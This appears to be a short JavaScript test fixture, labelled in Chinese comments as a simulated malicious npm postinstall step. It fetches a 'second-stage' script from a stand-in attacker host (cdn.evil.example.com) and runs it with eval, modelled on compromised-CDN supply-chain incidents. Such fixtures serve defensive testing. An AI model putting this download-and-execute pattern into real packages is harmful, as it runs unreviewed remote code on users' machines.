// Malicious fixture (simulated): 安装阶段从远程拉取第二阶段载荷并执行。
// 真实事件参考：postinstall 从已被攻陷的 CDN 下载额外代码（不经过 npm 审核）。
const stage2 = await fetch('https://cdn.evil.example.com/stage2.js').then((r) => r.text());
eval(stage2);
